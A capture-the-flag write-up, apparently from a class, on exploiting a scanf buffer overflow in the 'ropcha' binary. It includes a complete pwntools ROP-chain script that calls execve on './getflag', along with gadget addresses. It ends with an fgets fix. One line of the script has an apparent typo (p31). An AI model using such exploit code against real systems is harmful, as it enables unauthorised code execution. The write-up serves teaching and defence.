ropcha
==============

Overview
--------
The given program protects a file containing the flag by only printing its content if the user manages to insert 100000000 random ascii captchas in 5 seconds.

Vulnerability
-------------
Before the start of the captcha challenge the program prompts the user for his or her name and stores that input in a buffer to display a personalised welcome message containing that name. For reading the input `scanf` is used which does not do any length checks. This leaves the door open for buffer overflow attacks.

Exploitation
------------
Since the this challenge was about return oriented programming I knew that I had to get some gadgets so I took a look at `file ./ropcha` and found that it was statically linked. Next I got myself a list of all the available gadgets by calling `ROPgadget --binary ./ropcha > gadgets.txt`. After reading the provided documentation about syscalls and the `execve` call I had a general shape in mind of what I had to do to the `getflag`. First I had to fill some registers by putting the needed value on the stack preceded by the address of a gadget that would pop that value into the register. I tried a little and found that doing this was easy but there was still an unanswered question. Where should I put the string with the executables file name and how can I get this locations address which would go into the ebx register. I remembered the tutorial from class and how Marco was able to change the contents of a global variable so I looked at his writeup on github and basically mirrored his approach with the biggest difference being that I had to do so multiple times since the value I wanted to write was larger than four bytes. So I found myself the address of a global char buffer which was large enough to hold my string by calling `objdump -D ./ropcha | grep -E "<msg_ok>"` and greped for some more gadgets. The rest was just concatenating the payload together in a way that would first write the file name to said location, pop the syscall arguments into the right registers and then make the syscall.  

Here is my exploit script:

    #!/usr/bin/python2
    import sys
    from pwn import *


    str_loc = 0x080f1230
    null = p32(0x00000000)
    call_code = p32(0x0000000b)

    pop_eax = p32(0x080bd8c6)
    pop_ebx = p32(0x080481d1)
    pop_edx = p32(0x0806f6bb)
    pop_edx_ecx_ebx = p32(0x0806f6e1)
    mov_ptr_edx_eax = p32(0x08057755)
    syscall = p31(0x080499d3)

    payload = 'A'*28 \
                + pop_edx + p32(str_loc) \
                + pop_eax + './ge' \
                + mov_ptr_edx_eax \
                + pop_edx + p32(str_loc + 4) \
                + pop_eax + 'tfla' \
                + mov_ptr_edx_eax \
                + pop_edx + p32(str_loc + 8) \
                + pop_eax + 'g\0\0\0' \
                + mov_ptr_edx_eax \
                + pop_eax + call_code \
                + pop_edx_ecx_ebx + null + null + p32(str_loc) \
                + syscall


    def main():
        if len(sys.argv) > 1:
            r = remote('10.3.0.5', 31337)
        else:
            r = process("./ropcha")
        r.sendline(payload)
        r.interactive()


    if __name__ == '__main__':
        main()

And here are the notes I took while searching for gadgets:

    0x080bd8c6 : pop eax ; ret
    0x080481d1 : pop ebx ; ret
    0x0806f6bb : pop edx ; ret
    0x0806f6e1 : pop edx ; pop ecx ; pop ebx ; ret
    0x080499d3 : int 0x80
    0x08057755 : mov dword ptr [edx], eax ; ret

    080f1120 <msg_error>
    080f1160 <msg_banner>
    080f11ec <msg_name>
    080f1200 <msg_numcaptcha>
    080f1218 <msg_question>
    080f1230 <msg_ok>
    080f1240 <msg_nope>
    080f1260 <msg_welldone>
    080f12a0 <msg_fail>

Solution
--------

    - scanf("%[^\n]s", name);
    + fgets(name, NAME_LENGTH, stdin);

This approach only reads as many bytes as the second argument specifies minus one. Another option would be to not personalise the message so the program doesn't write any user input in a potentially overflowing buffer. In both cases the ability to write arbitrary things onto the stack would be cut out of the program.
